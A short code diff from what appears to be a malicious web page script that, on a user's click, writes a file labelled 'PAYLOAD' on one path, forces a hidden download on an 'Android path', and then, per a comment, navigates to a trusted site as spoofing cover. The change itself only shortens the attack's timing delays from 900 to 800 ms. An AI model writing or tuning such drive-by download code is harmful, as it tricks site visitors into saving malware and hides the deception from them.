@@ -20,7 +20,7 @@ document.addEventListener('click', async () => {
                 await w.write('PAYLOAD');
                 await w.close();
             } catch(e) {}
-        }, 900);
+        }, 800);
         
     } else {
         // === ANDROID PATH ===
@@ -32,7 +32,7 @@ document.addEventListener('click', async () => {
             });
             document.body.appendChild(a);
             a.click();
-        }, 900);
+        }, 800);
     }
     
     // === SPOOFING: Navigate ke trusted site ===
